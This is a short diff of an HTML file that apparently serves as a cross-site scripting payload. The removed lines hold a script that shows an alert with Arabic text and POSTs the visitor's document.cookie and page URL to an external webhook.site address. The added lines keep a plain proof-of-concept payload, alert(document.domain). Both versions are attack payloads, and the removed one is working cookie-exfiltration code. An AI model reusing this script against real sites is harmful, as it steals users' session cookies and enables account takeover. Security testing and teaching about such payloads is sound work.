@@ -1,13 +1,6 @@
-<body>
-  <script>
-    alert("🔥 XSS - الأساطبر وصل 🔥");
-    // أو استخراج بيانات
-    fetch("	https://webhook.site/ec601f90-3768-46ba-a151-110e3a9e7e74", {
-      method: "POST",
-      body: JSON.stringify({
-        cookies: document.cookie,
-        location: location.href
-      })
-    });
-  </script>
-</body>
+<!DOCTYPE html>
+<html>
+  <body>
+    <script>alert(document.domain)</script>
+  </body>
+</html>
